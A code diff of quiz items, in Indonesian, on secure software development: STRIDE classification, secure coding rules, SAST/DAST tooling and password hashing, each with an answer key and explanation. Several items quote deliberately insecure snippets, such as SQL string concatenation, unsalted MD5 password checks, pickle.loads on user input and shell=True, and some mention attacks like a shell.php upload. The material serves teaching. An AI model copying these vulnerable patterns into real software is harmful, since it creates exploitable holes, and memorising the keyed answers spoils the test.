-            ["Ancaman Tampering terhadap 'Data in Transit' paling efektif dicegah dengan?", "TLS/SSL (Transport Layer Security)", "Hashing data di server", "Audit logging", "TLS menjaga kerahasiaan dan integritas (cegah tampering) selama transmisi di kabel."],
-            ["Ancaman Tampering terhadap 'Data at Rest' (di Database) dicegah dengan?", "Enkripsi Database, Hashing, & Access Control ketat", "Hanya TLS", "CAPTCHA", "Melindungi storage memerlukan enkripsi di level disk/file."],
-            ["Apakah Threat Modeling harus mengevaluasi DFD sampai Level yang paling detail (Level 2/3)?", "Ya, sesuai kebutuhan untuk menemukan Trust Boundary yang berisiko", "Tidak, Level 0 sudah cukup", "Tidak, DFD tidak relevan", "Level dekomposisi DFD yang lebih dalam membuka visibilitas terhadap komponen internal yang rentan."],
-            ["Ketika Threat Model mengidentifikasi risiko, langkah selanjutnya adalah?", "Membuat mitigasi / kontrol keamanan untuk risiko tersebut", "Menghapus fitur tersebut", "Membiarkan saja", "Esensi threat modeling adalah menemukan ancaman untuk didesainkan mitigasinya."],
-            ["Model selain STRIDE yang menilai risiko berdasarkan faktor seperti Damage, Reproducibility, dll adalah?", "DREAD", "PASTA", "OCTAVE", "DREAD adalah metode klasik penilaian tingkat bahaya kerentanan."],
-            ["Manakah komponen DFD yang BUKAN merupakan sasaran dalam STRIDE?", "User Interface Color Scheme", "Data Store", "Data Flow", "STRIDE fokus pada elemen pengolah data (Proses, Store, Flow, Interactor), bukan kosmetik UI."],
-            ["Jika sebuah proses membaca data dari file teks konfigurasi lokal (untrusted), file tersebut bertindak sebagai?", "Trust Boundary perlintasan dari External Store", "Komponen aman", "Mitigasi", "File lokal yang bisa dimodifikasi user adalah batas kepercayaan yang rentan dimanipulasi (Tampering)."],
-            ["Apakah mitigasi keamanan harus menihilkan (100% menghapus) risiko?", "Tidak, tujuannya menurunkan risiko ke level yang dapat diterima (Acceptable Risk)", "Ya, sistem harus 100% aman", "Tidak, karena mitigasi itu murah", "Tidak ada sistem 100% aman. Mitigasi mereduksi risiko (Risk Mitigation)."],
+            // --- KASUS: ERROR HANDLING & LEAKAGE ---
+            ["Studi Kasus: Layar error menampilkan: <code>java.sql.SQLException: Column 'username' not found at line 45</code>. Aturan Secure Coding apa yang dilanggar?", "Error Handling (Terjadi Information Disclosure)", "Input Validation yang kurang ketat", "Output Encoding", "Menampilkan Stack Trace ke end-user membocorkan struktur internal aplikasi. Error wajib ditangkap dan diganti menjadi pesan Umum (Generic)."],
+            ["Studi Kasus: Sesuai prinsip 'Error Umum', jika validasi file upload gagal, pesan apa yang paling aman dikembalikan ke user?", "Upload gagal. Pastikan format file sesuai.", "Error 500: IOException at file_parser.py line 20", "Gagal. Script Anda mengandung payload XSS.", "Pesan harus generik. Memberitahu attacker bahwa 'Payload XSS terdeteksi' malah memberinya informasi (feedback) tentang sistem deteksi kita."],
 
-            // --- TOPIC 6: 5 Secure Coding Rules (30 Soal) ---
-            ["Apa urutan Pseudocode aman yang absolut dari level algoritma yang dipelajari?", "VALIDATE → HASH → PARAMETERIZED QUERY → ERROR UMUM", "HASH → QUERY → VALIDATE → ERROR UMUM", "QUERY → HASH → VALIDATE → ERROR UMUM", "Aturan: Validasi pertama, Hash password, Query Parameterized, Tangkap error dengan aman."],
-            ["Metode validasi input yang sangat disarankan karena ketat adalah 'Whitelisting'. Artinya?", "Hanya mengizinkan karakter spesifik yang diketahui aman", "Menolak kata kunci berbahaya", "Menghapus semua karakter simbol", "Whitelisting aman karena hanya mengizinkan apa yang didefinisikan aman secara default."],
-            ["Mengapa 'Blacklisting' dalam validasi input dianggap tidak efektif?", "Attacker selalu punya cara bypass via encoding baru", "Blacklisting membuat server terlalu berat", "Melanggar regulasi penamaan variabel", "Filter blacklist gagal jika attacker menyandikan karakter (URL/Hex Encoding)."],
-            ["Rule mitigasi mutlak untuk mencegah kerentanan SQL Injection di sisi Backend?", "Parameterized Query (Prepared Statements)", "Enkripsi Database", "Menyembunyikan Pesan Error", "Parameterized Query memaksa database membaca input murni sebagai data, bukan perintah SQL."],
-            ["Bagaimana cara kerja Parameterized Query sehingga kebal SQL Injection?", "Memisahkan struktur logika SQL dengan payload data user", "Menghapus karakter kutip ganda", "Mengenkripsi string SQL", "Struktur query di-compile dulu, lalu input user disisipkan sebagai string biasa."],
-            ["Bagaimana cara standar industri untuk menyimpan password pengguna?", "Hashing lambat (bcrypt/Argon2) + Salt unik per user", "Enkripsi AES-256", "Hashing cepat (MD5/SHA1)", "Fungsi hashing lambat melawan kecepatan komputasi Brute-Force hardware modern."],
-            ["Apa fungsi menambahkan 'Salt' pada proses Hashing password?", "Mencegah serangan Rainbow Table dengan membuat hash tetap unik", "Memperpanjang string database", "Memungkinkan password di-decrypt", "Salt memastikan 2 user dengan password sama tetap memiliki hash yang berbeda."],
-            ["Menyimpan password menggunakan Enkripsi Simetris (AES) tidak disarankan karena?", "Enkripsi bersifat reversible; jika kunci bocor, semua password terbongkar", "Terlalu lambat dibanding MD5", "Dilarang standar web", "Jika private-key bocor, jutaan password bisa didekripsi menjadi plaintext seketika."],
-            ["Pencegahan utama serangan Cross-Site Scripting (XSS) adalah penerapan rule?", "Output Encoding / Context-Aware Escaping", "Parameterized Query", "Input Validation saja", "Encoding (contoh: < menjadi &lt;) memastikan browser menampilkan teks, bukan mengeksekusi JS."],
-            ["Aplikasi menampilkan error: 'Syntax error at line 42'. Ini menyalahi rule?", "Error Handling (Terjadi Information Disclosure)", "Output Encoding", "Input Validation", "Menampilkan detail teknis membocorkan struktur backend. Error wajib bersifat umum (Generic)."],
-            ["Sintaks `SELECT * FROM users WHERE id = ` + user_id; merupakan akar masalah kerentanan?", "SQL Injection (String Concatenation)", "Cross-Site Scripting", "Insecure Deserialization", "String Concatenation memasukkan payload user langsung ke logika SQL tanpa filter."],
-            ["Mitigasi standar untuk serangan Brute-Force Login adalah penerapan?", "Rate Limiting & Account Lockout", "Input Validation ketat", "Parameterized Query", "Membatasi jumlah request IP dan mengunci akun melumpuhkan serangan tebak otomatis."],
-            ["Untuk memitigasi serangan CSRF, metode teknisnya adalah?", "Anti-CSRF Token pada setiap form", "Koneksi HTTPS saja", "Output Encoding HTML", "Token rahasia sekali pakai memastikan request benar-benar berasal dari web sah."],
-            ["Memvalidasi ekstensi file (.jpg) via JavaScript di browser klien. Apakah aman?", "Tidak. Client-side mudah di-bypass. Backend wajib validasi ulang.", "Aman dan mengurangi beban server", "Aman jika browser diupdate", "Client-Side murni untuk UX. Attacker bisa pakai proxy. Backend validation absolut."],
-            ["Fungsi `eval()` dilarang karena berisiko memicu?", "Remote Code Execution (RCE) / Command Injection", "Cross-Site Scripting (XSS)", "Insecure Direct Object Reference", "Fungsi eval() mengeksekusi string input sebagai kode program, memicu takeover server (RCE)."],
-            ["Selain Parameterized Query, cara aman berinteraksi dengan Database di framework modern adalah?", "Menggunakan ORM (Object-Relational Mapping)", "Memakai root user", "Mengenkripsi semua tabel", "ORM seperti SQLAlchemy/Hibernate secara default menggunakan prepared statements."],
-            ["XSS Reflected berbeda dengan XSS Stored. XSS Stored lebih berbahaya karena?", "Payload berbahaya tersimpan di DB dan tereksekusi pada semua user yang membuka halaman tersebut", "Hanya butuh 1 klik url", "Tidak bisa di-encode", "Stored XSS menyebarkan eksploitasi ke banyak korban secara otomatis tanpa butuh phising URL."],
-            ["Kesalahan implementasi CORS (Cross-Origin Resource Sharing) wild-card '*' menyebabkan?", "Website mengizinkan domain mana saja untuk membaca respon API (Bocor data)", "Server akan selalu mati", "SQL Injection", "CORS '*' berarti tidak ada batas domain yang bisa mengambil data sensitif via AJAX."],
-            ["Kerentanan XML External Entity (XXE) dicegah pada level koding dengan cara?", "Menonaktifkan parsing DTD / external entities pada parser XML backend", "Memvalidasi string SQL", "Hashing file XML", "XXE mengeksploitasi fitur entity parser untuk membaca file server atau DoS."],
-            ["Sebuah cookie sensitif (Session ID) WAJIB dilindungi oleh flag apa saja agar aman?", "HttpOnly & Secure", "Path & Domain", "Max-Age saja", "HttpOnly mencegah script JS (XSS) mencuri cookie, Secure memastikan cookie hanya dikirim via HTTPS."],
-            ["Meng-hash password menggunakan MD5 atau SHA-1 hari ini dianggap?", "Berbahaya, karena sangat cepat dikalkulasi dan mudah di-crack", "Aman jika ditambah salt", "Sangat direkomendasikan", "Hardware GPU modern bisa menebak miliaran MD5 per detik. Algoritma harus lambat (bcrypt/Argon2)."],
-            ["Batas logikal Trust Boundary pada aplikasi Web MVC modern berada di?", "Antara Browser Klien (Controller Input) dan Logika Backend", "Di dalam Database", "Antara CSS dan HTML", "Backend tidak boleh mempercayai apapun yang datang dari Browser (Client)."],
-            ["Aplikasi menerima input URL gambar dari user, lalu server mendownloadnya secara internal. Ini rentan terhadap?", "SSRF (Server-Side Request Forgery)", "XSS", "IDOR", "SSRF terjadi saat server dikelabui untuk melakukan request HTTP ke jaringan internal yang tertutup."],
-            ["Cara terbaik melakukan 'Error Handling' yang aman adalah?", "Catch exception, log detailnya di server, tampilkan pesan generik ke user", "Print stack trace ke layar", "Bypass exception", "Log membantu dev memperbaiki bug tanpa membocorkan sistem ke user eksternal."],
-            ["Validasi Business Logic Flaws (misal: Diskon negatif) TIDAK BISA dilakukan menggunakan?", "WAF atau SAST otomatis", "Peer Code Review", "Unit Test", "Tools tidak mengerti aturan bisnis perusahaan, hanya manusia dan functional testing yang bisa."],
-            ["Aturan 'Defense in Depth' pada validasi input diartikan sebagai?", "Validasi di Klien (UX) DAN Validasi ketat di Backend", "Validasi di CSS", "Memakai 2 antivirus", "Klien untuk kenyamanan, Backend untuk keamanan absolut."],
-            ["Cacat keamanan Insecure Deserialization memungkinkan peretas untuk?", "Menyisipkan objek serialisasi berbahaya yang dieksekusi memori server", "Mencuri password plaintext", "Mengganti tema UI", "Deserialisasi data tak terpercaya bisa memicu Remote Code Execution (RCE)."],
-            ["Apa itu konsep 'Time-of-Check to Time-of-Use' (TOCTOU) dalam koding?", "Race condition di mana state file/sistem berubah antara waktu divalidasi dan waktu dieksekusi", "Kesalahan parsing waktu server", "SQLi pada kolom date", "Kerentanan asinkron yang sering terjadi pada operasi file system."],
-            ["Mengecek ekstensi file upload dengan Regex berakhiran '.php' adalah bentuk?", "Blacklisting (Lemah)", "Whitelisting", "Output Encoding", "Attacker bisa bypass dengan '.php5', '.pHP', atau null-byte injection. Whitelist '.jpg'/'.png' jauh lebih kuat."],
-            ["Dalam koding Python Flask, mematikan mode 'Debug=True' saat production adalah mutlak untuk mencegah?", "Information Disclosure (Werkzeug debugger console)", "SQL Injection", "XSS", "Debug mode yang aktif di production sering memberi akses eksekusi terminal (console) bagi attacker."],
+            // --- KASUS: TOOLING SAST (BANDIT) ---
+            ["Studi Kasus: Bandit SAST mengeluarkan alert: <code>B602 (subprocess_popen_with_shell_equals_true)</code>. Apa skenario serangannya?", "Command Injection (Attacker mengeksekusi shell OS)", "SQL Injection (Attacker men-drop tabel)", "XSS (Attacker mencuri cookie)", "Di Python, <code>shell=True</code> memicu shell environment asli (bash/cmd), memungkinkan attacker menyambung input dengan <code>&&</code> atau <code>;</code> untuk mengeksekusi perintah OS berbahaya."],
+            ["Studi Kasus: Bandit SAST melempar alert <code>B301 (pickle)</code> pada baris <code>data = pickle.loads(user_input)</code>. Mengapa ini fatal?", "Memicu Insecure Deserialization (RCE)", "Memicu kebocoran struktur folder", "Menyebabkan memori server penuh (DoS)", "Pickle di Python sangat tidak aman untuk un-trusted data. Attacker bisa merakit object yang saat di-deserialize (loads) langsung mengeksekusi shell/malware (RCE)."],
+            ["Studi Kasus: Laporan SAST menunjukkan 100 celah SQLi merah, tapi saat di-review manual, kode tersebut sudah pakai ORM dan tidak rentan. Ini disebut fenomena?", "False Positive", "False Negative", "Logic Flaw", "False Positive adalah saat tool men-flag kode aman sebagai bahaya karena tool gagal memahami konteks arsitektur perlindungan di layer atasnya."],
+            ["Studi Kasus: OWASP ZAP (DAST) menemukan celah pada form login saat aplikasi di-run, namun Bandit (SAST) tidak menemukannya. Mengapa bisa terjadi?", "DAST menyerang runtime dari luar (menemukan error konfigurasi/respon), SAST hanya menganalisa statis", "SAST Python tidak bisa membaca HTML", "DAST memiliki database lebih baru", "Kombinasi keduanya wajib karena DAST melihat efek eksploitasi nyata di runtime, sementara SAST hanya melihat potensi cacat di source code."],
 
-            // --- TOPIC 7: Tooling (SAST/DAST) & Microsoft SDL / Touchpoints (25 Soal) ---
-            ["Pengujian keamanan dengan memindai source code secara statis (pasif) disebut?", "SAST (Static Application Security Testing)", "DAST (Dynamic Application Security Testing)", "Penetration Testing", "SAST membaca kode mentah tanpa menjalankannya untuk mendeteksi pola celah."],
-            ["Kelemahan utama dari tool SAST adalah kecenderungannya menghasilkan banyak?", "False Positives (Alert merah pada kode yang aman secara konteks)", "False Negatives", "Crash pada server", "SAST tidak mengerti logika bisnis, sehingga sering teriak merah pada perlindungan layer lain."],
-            ["Metode mensimulasikan serangan black-box pada aplikasi yang berjalan (runtime) disebut?", "DAST (Dynamic Application Security Testing)", "SAST", "Software Composition Analysis (SCA)", "DAST menyerang endpoint HTTP dengan payload kotor untuk melihat respons sistem."],
-            ["Tool Bandit pada Python adalah contoh perangkat untuk metodologi?", "SAST", "DAST", "Firewall", "Bandit membaca file .py mendeteksi celah keamanan ekosistem Python."],
-            ["Tool OWASP ZAP (Zed Attack Proxy) adalah representasi metodologi?", "DAST / Proxy-based dynamic testing", "SAST", "Analisis Malware", "ZAP mencegat dan memodifikasi traffic HTTP saat aplikasi beroperasi."],
-            ["Di tool Bandit, warning kode 'B602' (shell=True) menandakan potensi ancaman?", "Command Injection (Eksekusi shell OS)", "SQL Injection", "XSS", "Subprocess dengan shell=True mengizinkan eksekusi perintah terminal via input."],
-            ["Di tool Bandit, warning 'B301' (penggunaan library pickle) memicu celah?", "Insecure Deserialization", "Cross-Site Request Forgery", "SQL Injection", "Unpickle byte-stream berbahaya dapat otomatis mengeksekusi script eksploitasi di memori."],
-            ["Tool untuk menganalisis library pihak ketiga dari CVE yang diketahui adalah?", "SCA (Software Composition Analysis)", "DAST", "WAF", "SCA menganalisa package.json/requirements.txt jika ada library rentan."],
-            ["Kelemahan utama dari alat DAST adalah ketidakmampuannya untuk?", "Menunjukkan letak baris source code persis tempat celah berada", "Mendeteksi header keamanan", "Mensimulasikan payload SQLi", "DAST bekerja black-box dari luar, jadi tidak tahu letak spesifik Line of Code error di backend."],
-            ["Peer Code Review (Manusia) sangat penting karena tools otomatis kesulitan mendeteksi?", "Cacat Logika Bisnis & Otorisasi Kompleks (Flaws)", "Hardcoded Password", "Library versi lama", "Cacat logika bisnis hanya bisa dipahami oleh analisa manusia."],
-            ["Konsep keamanan disisipkan sebagai 'titik sentuh' di fase SDLC merupakan model dari?", "7 Touchpoints (Gary McGraw)", "Microsoft SDL", "Agile Waterfall", "Touchpoints menawarkan fleksibilitas untuk menyisipkan aktivitas keamanan sesuai kebutuhan."],
-            ["Perbedaan filosofis utama Microsoft SDL dan Touchpoints Gary McGraw?", "SDL bersifat preskriptif berurutan, Touchpoints adaptif", "SDL untuk Linux, Touchpoints untuk Windows", "SDL tidak punya fase testing", "Microsoft SDL kaku dan terstruktur, Touchpoints menyentuh artefak yang ada."],
-            ["Touchpoint 1 (Abuse Cases) berfokus mengubah sudut pandang analis menjadi?", "Bagaimana fitur sistem bisa disalahgunakan oleh aktor jahat", "Bagaimana mempercepat query", "Bagaimana membuat UI lebih cantik", "Melihat fungsionalitas dari sudut pandang ancaman."],
-            ["Syarat utama pembuatan 'Security Requirements' yang baik (Touchpoint 2) adalah?", "Spesifik, terukur, dan dapat diverifikasi (di-test)", "Harus menggunakan kalimat abstrak", "Hanya dibuat di akhir sprint", "Kebutuhan keamanan tidak boleh samar, harus punya kriteria lulus/gagal."],
-            ["Kapan Architectural Risk Analysis (ARA) idealnya dilakukan menurut Gary McGraw?", "Sebelum kode mulai ditulis (Pre-coding/Design)", "Saat aplikasi siap rilis", "Bersamaan dengan unit testing", "Mengidentifikasi kelemahan desain sebelum menjadi kode yang mahal diperbaiki."],
-            ["Titik rawan utama yang dianalisis dalam Architectural Risk Analysis (ARA) adalah?", "Trust Boundary dan Dependency Eksternal", "Warna CSS", "Log server", "Menentukan garis di mana data masuk dari area tak terpercaya (Internet)."],
-            ["Risk-Based Security Testing (Touchpoint 5) berarti pengujian difokuskan pada?", "Komponen/fitur yang memiliki risiko ancaman paling tinggi", "Hanya halaman statis", "Fungsionalitas desain UI", "Tidak semua fitur diuji sama; prioritas pada fitur kritis (Login, Pembayaran)."],
-            ["Tujuan utama Code Review (Touchpoint 6) sebagai pelengkap tools otomatis adalah?", "Menemukan kelemahan logika bisnis (Business Logic Flaws)", "Mengecek error syntax typo", "Mengecek kecepatan algoritma", "Scanner buta konteks bisnis, manusia memvalidasi logika alur aplikasi."],
-            ["Touchpoint 7 (Penetration Testing) berfungsi sebagai verifikasi dengan cara?", "Mensimulasikan serangan nyata di environment runtime", "Membaca source code pasif", "Membuat diagram aliran data", "Membuktikan apakah celah teori bisa dieksploitasi sungguhan."],
-            ["Aktivitas Monitoring, Logging, dan Incident Response berada di Touchpoint?", "Security Operations (Touchpoint 8)", "Abuse Cases", "Security Requirements", "Keamanan adalah proses berjalan, tidak berakhir setelah deployment."],
-            ["Teknologi IAST (Interactive Application Security Testing) bekerja dengan cara?", "Menanamkan agent di dalam server (instrumentation) sambil aplikasi di-test secara dinamis", "Menjalankan ping network", "Menganalisa desain diagram", "IAST menggabungkan akurasi internal SAST dan pengujian dinamis DAST."],
-            ["Salah satu kelebihan SAST adalah kemampuannya men-scan aplikasi dalam kondisi?", "Mentah (Source code saja, tidak perlu di-compile/running)", "Harus di-compile sempurna", "Terkoneksi database produksi", "SAST membaca teks kode, sehingga bisa di-run bahkan saat aplikasi masih error syntax."],
-            ["Integrasi SAST terbaik di budaya DevSecOps diletakkan pada tahap?", "Pre-commit hook atau saat IDE mengetik kode", "Setelah rilis final", "Hanya saat audit tahunan", "Mempercepat feedback (Shift-Left) ke developer."],
-            ["Dalam Microsoft SDL, tahap yang mewajibkan penghapusan fitur lama berisiko adalah?", "Attack Surface Reduction", "Abuse Case", "Incident Response", "Mengurangi fitur tak terpakai berarti mengurangi jalan masuk attacker."],
-            ["Sertifikasi atau Final Security Review di Microsoft SDL bertujuan untuk?", "Memastikan aplikasi siap rilis dan seluruh bug prioritas tinggi telah diperbaiki", "Membuat iklan produk", "Menghitung biaya server", "Gate terakhir sebelum produk masuk tahap rilis resmi (Release)."],
+            // --- KASUS: HASHING & AUTHENTICATION ---
+            ["Studi Kasus: Kode autentikasi: <code>if md5(input_pwd) == db_password: login()</code>. Analisa kelemahannya!", "MD5 terlalu cepat; rentan Brute-force & ketiadaan Salt memicu Rainbow Table", "MD5 tidak bisa di-decrypt jika user lupa password", "MD5 menghasilkan hash yang terlalu panjang untuk database", "Algoritma Hashing modern wajib 'lambat' (seperti bcrypt/Argon2) untuk meredam kecepatan hardware peretas, dan wajib menggunakan Salt unik per user."],
+            ["Studi Kasus: Perusahaan mewajibkan otentikasi login pakai OTP ke HP karyawan selain password. Ini mitigasi dari?", "Menurunkan impact dari kebocoran/pencurian kredensial password (MFA)", "Mencegah SQL Injection", "Menutupi arsitektur server", "Multi-Factor Authentication (MFA) memastikan meski password dicuri, attacker tidak bisa masuk tanpa device fisik korban."],
+            ["Studi Kasus: Seorang penyerang menggunakan skrip otomatis untuk mencoba 10.000 kombinasi password admin dalam 1 menit. Bagaimana logika mitigasinya?", "Implementasi Rate Limiting dan Account Lockout", "Ubah password menjadi enkripsi AES", "Tambahkan parameter di query DB", "Rate limiting memblokir IP yang terlalu agresif, sementara Lockout mengunci akun setelah X kali percobaan gagal, membunuh serangan Brute-Force secara mekanis."],
 
-            // --- TOPIC 8: SAFECode, Vuln Mgmt, IAM, DevSecOps (25 Soal) ---
-            ["Apa itu SAFECode (Software Assurance Forum for Excellence in Code)?", "Konsorsium standar praktik terbaik industri untuk pengembangan software aman", "Antivirus buatan Microsoft", "Bahasa pemrograman baru", "Organisasi nirlaba yang menyusun best-practice dari pengalaman perusahaan besar."],
-            ["Manakah yang BUKAN merupakan area praktik utama SAFECode?", "Membiarkan arsitektur terbuka tanpa autentikasi", "Kontrol Keamanan Aplikasi", "Praktik Pengkodean (Secure Coding)", "SAFECode berfokus pada Desain, Coding, Testing, IAM, dan Vuln Management."],
-            ["Standar algoritma yang sangat direkomendasikan untuk enkripsi Data-at-Rest (diam di database) adalah?", "AES-256", "MD5", "Base64", "AES adalah standar enkripsi simetris militer."],
-            ["Standar protokol wajib untuk enkripsi Data-in-Transit (komunikasi jaringan) adalah?", "TLS 1.2 / TLS 1.3", "SSL v3", "HTTP", "Mencegah penyadapan Man-in-the-Middle."],
-            ["Kunci enkripsi rahasia (Secret Key / API Key) TIDAK BOLEH pernah disimpan di dalam?", "Source Code (Hardcoded di Git)", "Environment Variables", "Key Management Service (AWS KMS)", "Hardcoded key akan terekspos jika source code bocor atau di-reverse engineer."],
-            ["SLA (Service Level Agreement) Perbaikan Vulnerability level 'Kritis' umumnya harus ditangani dalam waktu?", "Kurang dari 24 hingga 48 jam", "30 Hari", "90 Hari", "Level kritis butuh patch darurat segera mencegah eksploitasi massal."],
-            ["Manajemen Identitas dan Akses (IAM) bertumpu pada dua pilar krusial, yaitu?", "Authentication (Verifikasi siapa) dan Authorization (Verifikasi hak)", "Frontend dan Backend", "Routing dan API", "IAM memastikan pengguna asli dan batasan aksesnya."],
-            ["Protokol OAuth2 di industri modern sangat aman karena menggunakan mekanisme?", "Delegasi akses via Token (Access Token) tanpa membagikan password", "Membagikan password plaintext", "Mengirim password via URL", "Token based auth mengizinkan akses sistem tanpa memberikan kredensial utama."],
-            ["Role-Based Access Control (RBAC) adalah implementasi langsung dari prinsip keamanan?", "Least Privilege", "Fail Secure", "Security by Obscurity", "Hak akses diberikan murni berdasarkan 'Peran' fungsional, tidak lebih."],
-            ["Data PII (Personally Identifiable Information) yang sangat sensitif dan dilarang untuk di-log adalah?", "Password plaintext, Token Sesi, Nomor Kartu Kredit lengkap", "Timestamp error", "ID User", "Mencegah pencurian data fatal jika server log disusupi hacker."],
-            ["Dalam Agile/DevOps, tugas-tugas mitigasi keamanan harus dimasukkan ke dalam?", "Security Stories dan ditambahkan ke Product Backlog", "Dokumen PDF terpisah", "Diabaikan demi mengejar sprint", "Keamanan harus di-track sebagai task transparan layaknya fitur biasa di Scrum."],
-            ["Akumulasi penundaan perbaikan bug keamanan dalam metodologi Agile dikenal sebagai?", "Security Debt", "Agile Velocity", "Burn-down chart", "Hutang keamanan yang menumpuk akan membebani masa depan software."],
-            ["Mengapa update otomatis library pihak ketiga (misal via Dependabot) direkomendasikan?", "Mencegah serangan rantai pasok (Supply Chain Attack) via library usang", "Agar UI lebih bagus", "Agar server ringan", "Celah CVE di library (Log4j, dsb) sering jadi pintu masuk utama attacker."],
-            ["Metode 'Fuzzing' (Fuzz Testing) di fase verifikasi dilakukan dengan cara?", "Mengirimkan input random/cacat secara massal untuk memicu respon crash aplikasi", "Mereview kode baris per baris", "Memeriksa port jaringan terbuka", "Mencari edge-cases dan memory leaks (buffer overflow)."],
-            ["Incident Response Plan wajib disiapkan di fase SDL mana?", "Release / Operations", "Requirements", "Design", "Tim harus punya SOP (Playbook) jika terjadi kebocoran pasca-deployment."],
-            ["CVSS (Common Vulnerability Scoring System) digunakan untuk?", "Memberikan skor numerik (0-10) atas tingkat keparahan sebuah kerentanan", "Menghitung baris kode", "Mengeksekusi exploit", "Metrik standar industri untuk mengklasifikasi bug menjadi Low, Med, High, Critical."],
-            ["Keuntungan utama dari infrastruktur sebagai kode (Infrastructure as Code / IaC) dari sisi keamanan adalah?", "Konfigurasi server bisa di-scan otomatis (SAST) sebelum di-deploy", "Lebih murah biayanya", "Tidak butuh admin", "IaC (Terraform/Ansible) mendokumentasikan server dalam kode yang bisa di-audit."],
-            ["Bagian dari CI/CD Pipeline yang bertugas menahan rilis jika ditemukan bug 'High' disebut?", "Quality/Security Gate", "Load Balancer", "Web Server", "Gate otomatis menggagalkan build jika tidak memenuhi batas keamanan."],
-            ["Single Sign-On (SSO) meningkatkan keamanan perusahaan karena?", "Mengurangi kelelahan password (password fatigue) dan sentralisasi kontrol", "Menyimpan password di cloud", "Mempercepat internet", "Karyawan cukup mengingat 1 MFA kuat, mematikan 1 akun langsung memutus akses ke semua aplikasi."],
-            ["Konsep Zero Trust Architecture berpusat pada filosofi utama:", "Never trust, always verify (Verifikasi selalu, baik dari luar maupun dalam jaringan)", "Percayai semua dari internal", "Hanya blokir IP luar negeri", "Lingkungan internal jaringan tak lagi dianggap aman, setiap request API diverifikasi otorisasi/otentikasinya."],
-            ["Apa itu 'Bug Bounty Program' di fase operasional?", "Memberikan imbalan (reward) pada peretas etis eksternal yang melaporkan celah di sistem live", "Menyewa satpam server", "Membayar vendor SAST", "Memanfaatkan kekuatan crowdsourcing hacker baik untuk menemukan bug yang terlewat tim internal."],
-            ["MFA (Multi-Factor Authentication) yang paling tahan terhadap serangan Phishing canggih adalah?", "Hardware Security Key (FIDO2 / YubiKey)", "SMS OTP", "Email Link", "FIDO2 key memvalidasi domain secara kriptografis, menolak phishing site meskipun user tertipu."],
-            ["Apa fungsi dari Secret Scanning Tools (misal: TruffleHog / GitGuardian)?", "Mendeteksi API key atau password yang tidak sengaja ter-commit ke repositori Git", "Mendeteksi SQLi", "Memperbaiki UI error", "Secret yang ter-push ke GitHub publik sering memicu kebocoran data raksasa."],
-            ["Menerapkan standar keamanan OWASP Top 10 paling krusial pada fase apa?", "Coding dan Verifikasi (Testing)", "Hanya di Operations", "Hanya di Requirements", "Membangun pertahanan melawan 10 serangan web paling umum secara teknikal di kode."],
-            ["Konsep di mana developer diajarkan keamanan untuk menyebarkan budaya DevSecOps disebut membentuk?", "Security Champions (Pendekar Keamanan di tiap tim scrum)", "Auditor Internal", "Manajer Tim", "Developer terlatih yang bertugas mengawasi keamanan kodingan rekan-rekannya secara harian."]
+            // --- KASUS: STRIDE & THREAT MODELING ---
+            ["Studi Kasus: Budi memodifikasi parameter URL dari <code>?id_transaksi=10</code> menjadi <code>?id_transaksi=12</code> dan berhasil melihat struk belanja Andi. Klasifikasi STRIDE?", "Information Disclosure (akibat IDOR)", "Spoofing", "Denial of Service", "Tereksposnya nota (data sensitif) tanpa hak milik melanggar aspek kerahasiaan. Celah spesifiknya adalah Insecure Direct Object Reference."],
+            ["Studi Kasus: Hacker memanipulasi form <code>&lt;input type='hidden' price='100'&gt;</code> menjadi '1' sebelum checkout. Masuk ancaman STRIDE kategori apa?", "Tampering (Manipulasi data in-transit/client)", "Repudiation", "Spoofing", "Hacker mengubah (tampering) struktur data logis yang tidak divalidasi ulang oleh backend."],
+            ["Studi Kasus: Seseorang menghapus log server setelah meretas, sehingga admin tidak punya bukti siapa pelakunya. Ancaman STRIDE?", "Repudiation (Penyangkalan)", "Elevation of Privilege", "Information Disclosure", "Menghancurkan log audit memungkinkan peretas melakukan penyangkalan (Repudiation) atas aksi ilegalnya."],
+            ["Studi Kasus: Aplikasi web membolehkan user mengganti avatar. Attacker meng-upload file <code>shell.php</code> dan mengaksesnya untuk membajak server. STRIDE?", "Elevation of Privilege (Remote Code Execution)", "Spoofing", "Denial of Service", "Attacker beralih dari 'user biasa' menjadi pemegang kendali 'server/OS' (Privilege Escalation tingkat ekstrem)."],
+            ["Studi Kasus: API Rumah Sakit down total akibat menerima 50 juta request palsu per detik. Elemen STRIDE?", "Denial of Service (DoS)", "Tampering", "Information Disclosure", "Resource server terkuras habis sehingga user/pasien sah tidak bisa mengakses layanan (Ketersediaan / Availability hancur)."],
+            ["Studi Kasus: Attacker mencuri Cookie 'SessionID' di warnet, lalu memakainya di laptopnya untuk masuk ke akun Facebook korban tanpa password. STRIDE?", "Spoofing (Menyamar identitas)", "Repudiation", "Elevation of Privilege", "Menggunakan session/kredensial milik orang lain adalah bentuk menyamar (Spoofing) sebagai entitas yang sah."],
+            ["Studi Kasus: Dalam Data Flow Diagram (DFD), input dari browser masuk ke proses 'Login Validator' di backend. Garis antara keduanya disebut?", "Trust Boundary", "External Data Store", "Sink Node", "Batas di mana data berpindah dari area tak terpercaya (klien) ke area terpercaya (server) adalah Trust Boundary, tempat wajibnya Input Validation."],
+
+            // --- PSEUDOCODE RULE (4 TAHAP) ---
+            ["Dalam standar desain level algoritma, apa urutan Pseudocode Aman yang mutlak?", "VALIDATE &rarr; HASH &rarr; PARAMETERIZED QUERY &rarr; ERROR UMUM", "HASH &rarr; QUERY &rarr; VALIDATE &rarr; ERROR UMUM", "QUERY &rarr; HASH &rarr; VALIDATE &rarr; ERROR UMUM", "Hukumnya: 1) Blokir input kotor (Validate), 2) Proses kriptografi (Hash), 3) Amankan transaksi DB (Query), 4) Tutupi jejak jika gagal (Error Umum)."],
+            ["Berdasarkan pseudocode aman, jika tahap 'VALIDATE' dilewati namun tahap lainnya dijalankan, apa risiko terbesarnya?", "Input kotor/malware bisa menumpuk di sistem dan memicu XSS/Business Logic Flaw", "SQL Injection pasti langsung terjadi", "Aplikasi tidak bisa di-compile", "Meski DB aman karena Parameterized Query, input berbahaya bisa lolos disimpan (Stored XSS) atau merusak logika bisnis."],
+
+            // --- KONSEP SDLC vs SECURE SDLC ---
+            ["SDLC Konvensional berfokus murni pada Fungsionalitas. Apa fokus dari Secure SDLC?", "Fungsionalitas + Keamanan", "Hanya Kecepatan Rilis", "Estetika UI/UX", "Keamanan diintegrasikan sebagai bagian tak terpisahkan dari fungsionalitas (Built-in), bukan tambahan."],
